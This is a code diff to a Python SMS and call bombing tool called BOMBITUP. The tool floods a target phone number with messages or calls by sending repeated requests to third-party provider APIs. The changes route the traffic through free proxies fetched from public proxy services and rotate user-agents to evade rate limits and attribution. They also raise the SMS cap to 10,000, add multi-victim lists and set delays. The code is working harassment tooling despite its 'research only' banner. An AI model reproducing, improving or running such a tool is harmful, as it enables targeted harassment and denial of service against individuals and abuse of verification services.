@@ -10,7 +10,8 @@ import argparse
 import sys
 #from concurrent.futures import ThreadPoolExecutor, as_completed
 import shutil
-import string, json, re
+import json
+import string, re
 import threading
 
 #--------------------------------------------
@@ -19,7 +20,7 @@ import threading
 
 class IconicDecorator(object):
     def __init__(self):
-        self.PASS = Style.BLINK + Fore.GREEN + "[ ✔  ]" + Style.RESET
+        self.PASS = Style.BLINK + Fore.GREEN + "[ ✔ ]" + Style.RESET
         self.FAIL = Style.BLINK + Fore.RED + "[ ✘ ]" + Style.RESET
         self.WARN = Style.BLINK + Fore.YELLOW + "[ ! ]" + Style.RESET
         self.HEAD = Style.BLINK + Fore.CYAN + "[ # ]" + Style.RESET
@@ -72,13 +73,37 @@ class MessageDecorator(object):
     def GeneralMessage(self, RequestMessage):
         print(self.STDS + " "  + RequestMessage + Style.RESET)
 
+def get_proxy():
+    print('Fetching proxies from server...')
+#    proxies = {'http':'http://157.230.247.57:3128','https':'https://157.230.247.57:3128'}
+    curl = get('https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true').text
+    if 'limit' in curl:
+        print('Gimmeproxy.com limit is leached. Now using pubproxy.com')
+        
+        curl = get('http://pubproxy.com/api/proxy?format=txt&type=http&country=TG,UA,VE,AD,AF,US,CA&not_country=IN,MX&port=3128&https=true&user-agent=true&cookies=true&referer=true&last_check=1').text
+        
+        if 'no proxy' in curl.lower():
+            print('Can\'t fetch proxies')
+            return None
+        print(f'Using proxies: http://{curl} https://{curl}')
+        return {"http":f'http://{curl}','https':f'https://{curl}'}
+    
+    print(f"Using proxies: {curl} {curl.replace('http','https')}")
+    return {"http":curl,'https':curl.replace('http','https')}
+#for i in range(0,10):
+#get_proxy()
+#sleep(10)
+#google = get('https://www.google.com',proxies=None).text
+#print()
+#print(google)
+#sys.exit()
 class APIProvider:
 
     api_providers=[]
     delay = 0
     status = True
 
-    def __init__(self,cc,target,mode,delay=0):
+    def __init__(self,cc,target,mode,proxies,delay=0):
         with open('apidata.json', 'r') as file:
             PROVIDERS = json.load(file)
         self.config = None
@@ -86,7 +111,9 @@ class APIProvider:
         self.target = target
         self.mode = mode
         self.index = 0
+        self.proxies = proxies
         self.lock = threading.Lock()
+        self.ncc = readisdc(self.cc)
         APIProvider.delay = delay
         providers=PROVIDERS.get(mode.lower(),{})
         APIProvider.api_providers = providers.get(cc,[])
@@ -94,28 +121,38 @@ class APIProvider:
 
     def format(self):
         config_dump = json.dumps(self.config)
-        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc)
+        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc).replace("{ncc}",self.ncc)
         self.config = json.loads(config_dump)
-        sleep(5)
 
     def select_api(self):
-        try:
-            self.index = choice(range(len(APIProvider.api_providers)))
-        except IndexError:
-            self.index=-1
-            return
-        self.config = APIProvider.api_providers[self.index]
+        self.config = choice(APIProvider.api_providers)
+#        try:
+#            self.index = choice(range(len(APIProvider.api_providers)))
+#        self.index = 18
+#        except IndexError:
+#            self.index=-1
+#            return
+#        self.config = APIProvider.api_providers[self.index]
         
         with open('.agents','rt') as file:
             readen = file.read()
             heads = readen.split('\n')
             
         perma_headers = choice(heads)
+        
         if "headers" in self.config:
-            self.config["headers"].update(perma_headers)
+            config = self.config
+            head = config.get('headers',{})
+            head["user-agent"] = perma_headers
         else:
-            self.config["headers"]=perma_headers
+            self.config["headers"] = {}
+            heads = self.config.get('headers',{})
+            heads["user-agent"] = perma_headers
+            
         self.format()
+#        print('\nIn select_api\n')
+#        print(self.config)
+#        sleep(2)
 
     def remove(self):
         try:
@@ -131,21 +168,22 @@ class APIProvider:
         identifier=self.config.pop("identifier","").lower()
         del self.config['name']
         self.config['timeout']=30
-        del self.config['headers']
+        self.config['proxies'] = self.proxies
+#        del self.config['headers']
 #        del self.config['method']
         response=reqt(**self.config)
-        print(self.config)
-        print(response)
+#        print('\nIn request\n')
+#        print(self.config)
+#        print(response)
 #        return identifier in response.text.lower()
         response = int(str(response).replace('>','').replace('<Response','').replace(' ','').replace('[','').replace(']',''))
         print(response)
-        sleep(5)
+#        sleep(1)
         if response in range(200,300):
             return True
         elif response not in range(200,300):
             return False
-        else:
-            return None
+        return None
 
     def hit(self):
         try:
@@ -155,7 +193,8 @@ class APIProvider:
             self.lock.acquire()
             response = self.request()
             if response==False:
-                self.remove()
+#                self.remove()
+                pass
             elif response==None:
                 APIProvider.status=False
             return response
@@ -167,10 +206,12 @@ class APIProvider:
 
 
 
-def readisdc():
+def readisdc(cc):
     with open("isdcodes.json") as file:
         isdcodes = json.load(file)
-    return isdcodes
+        isdcodes = isdcodes.get('isdcodes',{})
+        ncc = isdcodes[cc].lower()
+    return ncc
 
 def get_version():
     try:
@@ -290,13 +331,13 @@ def check_for_updates():
 def check_intr():
     if connected():
         mesgdcrt.SuccessMessage('Connected to internet !')
-        sleep(2)
+        sleep(1)
         if sys.version_info[0]!=3:
             mesgdcrt.FailureMessage("BOMBITUP will work only in Python v3")
             sys.exit()
 
         try:
-            country_codes = readisdc()["isdcodes"]
+            country_codes = readisdc('91')
         except FileNotFoundError:
             update()
 #        check_for_updates()
@@ -304,27 +345,27 @@ def check_intr():
         mesgdcrt.FailureMessage("Poor internet connection detected")
 #        exit()
 
-def pretty_print(cc,target,success,failed):
+def pretty_print(cc,target,success,failed,mode,delay):
     mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
     mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
     mesgdcrt.GeneralMessage(f"Target       :   +{cc} {str(target)}")
-    mesgdcrt.GeneralMessage(f"Sent         :   {str(failed + success)} msg")
-    mesgdcrt.GeneralMessage(f"Success      :   {str(success)} msg")
-    mesgdcrt.GeneralMessage(f"Failed       :   {str(failed)} msg")
+    mesgdcrt.GeneralMessage(f"Sent         :   {str(failed + success)}")
+    mesgdcrt.GeneralMessage(f"Success      :   {str(success)}")
+    mesgdcrt.GeneralMessage(f"Failed       :   {str(failed)}")
+    mesgdcrt.GeneralMessage(f"Delay        :   {delay} seconds")
     mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
     
-def workernode(mode,cc,target,count):
-    delay = 0
-    api = APIProvider(cc,target,mode,delay=delay)
+def workernode(mode,cc,target,count,delay,proxies):
     
+    api = APIProvider(cc,target,mode,proxies,delay)
     clr()
     max_threads = 100
     bann_text()
     mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
     mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
     mesgdcrt.GeneralMessage(f"Target        :   +{cc} {str(target)}")
-    mesgdcrt.GeneralMessage(f"Amount        :   {str(count)}  msg")
-#    mesgdcrt.GeneralMessage(f"Delay         :   {str(delay)}   seconds")
+    mesgdcrt.GeneralMessage(f"Amount        :   {str(count)}")
+    mesgdcrt.GeneralMessage(f"Delay         :   {delay} seconds")
     mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
     print()
     input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
@@ -338,25 +379,25 @@ def workernode(mode,cc,target,count):
         sys.exit()
 
     success,failed=0,0
-    while success + failed < count:
+    while success < count:
         
 #        try:
-        print('\nHey hit1:\n')
+#        print('\nHey hit1:\n')
         result = api.hit()
         
 #        print('\nHey hit2:\n')
 #        print(api.hit())
-#        print('\nHey result:\n')
+#        print(f'\n{api.hit()}')
+#        print('\nHey request:\n')
 #        print(api.request())
 
-        sleep(3)
+        sleep(2)
         if result:
 #                print(result+'s')
             success+=1
         elif not result:
 #                print(result+'f')
             failed+=1
-    
 #        except:
 #            failed+=1
 
@@ -380,7 +421,8 @@ def workernode(mode,cc,target,count):
 #                    failed+=1
 #-------------------------------------------------------------------------------------
         clr()
-        pretty_print(cc,target,success,failed)
+        pretty_print(cc,target,success,failed,mode,delay)
+        sleep(delay-3 if delay>0 else delay)
     print("\n")
     mesgdcrt.SuccessMessage("Bombing completed!")
     sleep(1)
@@ -389,7 +431,7 @@ def workernode(mode,cc,target,count):
 def selectnode(mode):    
     mode=mode.lower().strip()
     if mode == 'mail':
-        print('Coming soon!')
+        mesgdcrt.WarningMessage('Coming soon!')
         exit()
     else:
         pass
@@ -412,8 +454,10 @@ def selectnode(mode):
                 if cc == '91':
                     if mode == 'call':
                         limit = 200
+                        mindelay = 5
                     else:
-                        limit = 1000
+                        mindelay = 0
+                        limit = 10000
                 break
             else:
                 mesgdcrt.FailureMessage('Invalid Country Code !')
@@ -444,11 +488,11 @@ def selectnode(mode):
                         mesgdcrt.FailureMessage('Invalid number !')
                         sleep(1)
 
-                    elif ',' not in victimNumber and (len(victimNumber) > 12):
+                    elif  not (',' in victimNumber) and (len(victimNumber) > 12):
                         mesgdcrt.FailureMessage('Invalid number !')
                         sleep(1)
                         
-                    elif cc == '91' and len(victimNumber) != 10:
+                    elif cc == '91' and len(victimNumber) != 10 and  not (',' in victimNumber):
                         mesgdcrt.FailureMessage('Invalid number !')
                         sleep(1)
                         
@@ -460,59 +504,115 @@ def selectnode(mode):
                 mesgdcrt.FailureMessage(' Invalid option !')
                 sleep(1)
 
+        victimsLis = []
         if victimNumber == defualtNum():
-            pass
+            victimsLis = defualtNum()
         elif len(victimNumber) in range(6,13) and victimNumber.isnumeric():
-            test.append(victimNumber)
-            victimNumber = test
+            victimsLis.append(victimNumber)
         else:
-            victimsLis = victimNumber.split(',')
-            testLis1 = []
-            testLis2 = victimsLis.copy()
+            testLis1 = victimNumber.split(',')
+            print(testLis1)
+            sleep(2)
+            testLis2 = []
 
-            for num in victimsLis:
-
+            for num in testLis1:            
+                print(num)
                 if len(num) in range(6,13) and num.isnumeric():
-                    pass
+                    if cc == '91' and len(num) != 10:
+                            mesgdcrt.FailureMessage('Invalid number is present in the list. Removing it..')
+                            testLis2.append(num)
+                            mesgdcrt.SuccessMessage('Number removed !\n')
+                            sleep(2)
 
-                elif (len(num) not in range(6,13)):
-                    mesgdcrt.FailureMessage(f'Invalid number is present at index {victimsLis.index(num) + 1}')
-                    victimsLis.remove(num)
+                elif not(len(num) in range(6,13)):
+                    mesgdcrt.FailureMessage(f'Invalid number is present in the list. Removing it..')
+                    testLis2.append(num)
                     mesgdcrt.SuccessMessage('Number removed !\n')
-                    sleep(1)
-                
-        #        elif num in testLis2:
-        #            print(f'[*]Duplicate number is present at index {victimsLis.index(num) + 1}')
-        #            victimsLis.remove(num)
-        #            print('[*]Number removed !\n')
+                    sleep(2)
+                else:
+                    mesgdcrt.FailureMessage(f'Invalid number is present in the list. Removing it..')
+                    testLis2.append(num)
+                    mesgdcrt.SuccessMessage('Number removed else !\n')
+                    sleep(2)
 
-
-            victimNumber = victimsLis
+#                    elif num in testLis12:
+#                        print(f'[*]Duplicate number is present at index {victimsLis.index(num) + 1}')
+#                        testLis1.remove(num)
+#                        print('[*]Number removed !\n')
+            for a in testLis1:
+                if not (a in testLis2):
+                    victimsLis.append(a)
+                    
+            if len(victimsLis) < 1:
+                mesgdcrt.FailureMessage('None of the number is valid please re-enter the numbers ')
+                sleep(2)
+                selectnode(mode)
+            else:
+                victimNumber = victimsLis
 
         
         while True:
             clr()
             bann_text()
-            msgCount = input(mesgdcrt.CommandMessage(f'How many msg\\call do you want to send to the victim max {limit} : '))
-            if msgCount.isnumeric():
+            lis = []
+            for Number in victimsLis:
+                lis.append(f'+{cc} {Number}')
+            mesgdcrt.SuccessMessage(f'Victims: {lis}')
+            msgCount = input(mesgdcrt.CommandMessage(f'How many {mode}\'s do you want to send to the victim max {limit} : '))
+            msgCount = msgCount.replace(' ','')
+            
+            if msgCount == '':
+                mesgdcrt.FailureMessage('Invalid value')
+                mesgdcrt.SuccessMessage(f'Automatically setting msg count to {limit - 1}')
+                msgCount = limit - 1
+                sleep(2)
+                break
+                
+            elif msgCount.isnumeric():
                 msgCount = int(msgCount)
                 if msgCount < 1:
                     mesgdcrt.FailureMessage('Invalid value must be atleast 1')
-                    mesgdcrt.SuccessMessage('Automatically capping msg count to min value (1)')
+                    mesgdcrt.SuccessMessage('Automatically setting msg count to min value (1)')
                     msgCount = 1
-                    sleep(1)
+                    sleep(2)
 
                 elif msgCount > limit:
                     mesgdcrt.FailureMessage(f'Invalid value max {limit}')
                     mesgdcrt.SuccessMessage(f'Automatically capping msg count to max value ({limit})')
                     msgCount = limit
-                    sleep(1)
+                    sleep(2)
 
                 break
 
             else:
                 mesgdcrt.FailureMessage('Invalid value !')
-                sleep(1)
+                sleep(2)
+                
+#        if mode == 'call':
+#            while True:
+        clr()
+        bann_text()
+        delay = input(mesgdcrt.CommandMessage(f'Enter the delay between {mode}\'s (min {mindelay} and max 20): '))
+        dealy = delay.replace(' ','')
+        if delay == '':
+            mesgdcrt.FailureMessage('Invalid value')
+            mesgdcrt.SuccessMessage(f'Automatically capping msg count to min value ({mindelay})')
+            delay = mindelay
+            sleep(2)
+        elif delay.isdigit():
+            delay = int(delay)
+            if delay > 20:
+                mesgdcrt.FailureMessage('Invalid value can\'t more than 20')
+                mesgdcrt.SuccessMessage('Automatically capping msg count to min value (20)')
+                delay = 20
+                sleep(2)
+
+            elif delay < mindelay:
+                mesgdcrt.FailureMessage(f'Invalid value must be atleast {mindelay}')
+                mesgdcrt.SuccessMessage(f'Automatically capping msg count to min value ({mindelay})')
+                delay = mindelay
+                sleep(2)
+#                break
 #        proxies = {
 #                    'http': 'socks5://139.59.53.105:1080',
 #                    'https': 'socks5://139.59.53.105:8080'
@@ -521,9 +621,15 @@ def selectnode(mode):
 #        tor = (tor.replace('\n', ''))
 #        print(tor)
 #        print("[*]launch Tor - OK")
-        
-        for target in victimNumber:
-            workernode(mode,cc,target,msgCount)
+        start = time()
+        for target in victimsLis:
+            try:
+                proxies = get_proxy()
+#                proxies = None
+            except:
+                proxies = None
+            workernode(mode,cc,target,msgCount,delay,proxies)
+        mesgdcrt.SuccessMessage(f'It\'s took {round(time()-start)} secs to bomb the {mode}\'s to victim')
         
     except KeyboardInterrupt :
         print('\n')
@@ -557,11 +663,9 @@ parser.add_argument("-v","--version", action="store_true",help="show current BOM
 
 
 file = 'victims_numbers.txt'
-test = []
 
 
 if __name__ == "__main__":
-    start = time()
     args = parser.parse_args()
     if args.version:
         print("Version: ",__VERSION__)
@@ -570,14 +674,17 @@ if __name__ == "__main__":
     elif args.update:
         update()
     elif args.mail:
-        selectnode(mode="mail")
+        mode="mail"
+        selectnode(mode)
     elif args.call:
-        selectnode(mode="call")
+        mode="call"
+        selectnode(mode)
     elif args.sms:
-        selectnode(mode="sms")
+        mode="sms"
+        selectnode(mode)
     else:
         choic=""
-        avail_choic={"1":"SMS","2":"CALL ","3":"MAIL"}
+        avail_choic={"1":"SMS","2":"CALL ","3":"MAIL","4":"EXIT"}
         try:
             while (not choic in avail_choic):
                 clr()
@@ -587,11 +694,15 @@ if __name__ == "__main__":
                     print(f"[ {key} ] {value} BOMB")
                 print()
                 choic=input(mesgdcrt.CommandMessage("Enter Choice : "))
-            selectnode(mode=avail_choic[choic].lower())
+                if choic == "4":
+                    clr()
+                    bann_text()
+                    sys.exit()
+            mode=avail_choic[choic].lower()
+            selectnode(mode)
         except KeyboardInterrupt : 
             print('\n')
             mesgdcrt.WarningMessage("Received INTR call - Exiting...")
-            sys.exit()
-    print(f'\nIt\'s took {round(time()-start)} secs to bomb the {mode}s to victim')
+#            sys.exit()
     sys.exit()
     
